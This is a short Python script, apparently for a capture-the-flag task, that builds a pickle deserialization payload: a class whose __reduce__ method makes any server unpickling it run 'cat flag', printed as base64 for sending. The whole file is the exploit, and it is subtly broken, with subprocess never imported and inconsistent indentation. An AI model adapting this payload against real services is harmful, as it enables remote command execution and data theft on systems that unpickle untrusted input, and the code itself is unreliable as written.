import pickle
import base64

class Reveal:
    def __reduce__(self):
      cmd=("cat","flag")
        return subprocess.check_output,(cmd,)

payload_bytes = pickle.dumps(Reveal())
print(base64.urlsafe_b64encode(payload_bytes))
